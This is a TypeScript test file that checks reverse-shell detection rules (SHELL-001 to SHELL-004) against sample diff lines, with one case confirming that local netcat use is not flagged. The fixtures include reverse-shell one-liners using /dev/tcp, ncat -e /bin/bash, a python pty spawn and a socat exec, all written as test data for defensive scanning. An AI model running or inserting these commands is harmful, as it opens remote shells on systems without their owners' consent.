import { describe, expect, it } from 'vitest';
import { REVERSE_SHELL_RULES } from './reverse-shell.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('reverse-shell rules', () => {
  it.each([
    ['SHELL-001', 'exec 3<>/dev/tcp/10.0.0.1/4444'],
    ['SHELL-002', 'ncat 10.0.0.1 4444 -e /bin/bash'],
    ['SHELL-003', 'python3 -c "import socket; s = socket.socket()'],
    ['SHELL-003', 'pty.spawn("/bin/bash")'],
    ['SHELL-004', 'socat TCP-LISTEN:4444,fork EXEC:/bin/sh'],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(REVERSE_SHELL_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it('does not flag harmless netcat usage', () => {
    const change = makeChange(addedOnlyDiff(['echo test | nc localhost 1234']));
    expect(REVERSE_SHELL_RULES.flatMap((rule) => rule.check(change) ?? [])).toHaveLength(0);
  });
});
